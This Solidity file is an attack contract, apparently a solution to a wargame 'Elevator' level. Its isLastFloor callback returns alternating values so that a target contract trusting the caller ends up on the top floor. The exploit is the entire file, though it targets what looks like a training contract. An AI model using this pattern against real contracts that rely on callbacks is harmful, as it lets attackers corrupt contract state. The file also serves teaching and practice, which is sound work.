//SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface Elevator{
    function goTo(uint _floor) external;
}

contract HackBuilding {
    bool onetime = false;
    Elevator elevate;
    constructor(address _elevator){
        elevate = Elevator(_elevator);
    }

    function exploit() public {
        elevate.goTo(100);
    }

    function isLastFloor(uint) external returns (bool) {
        if(onetime == false){
            onetime = true;
        }
        else {
            onetime = false;
        }
        return !onetime;
    }
}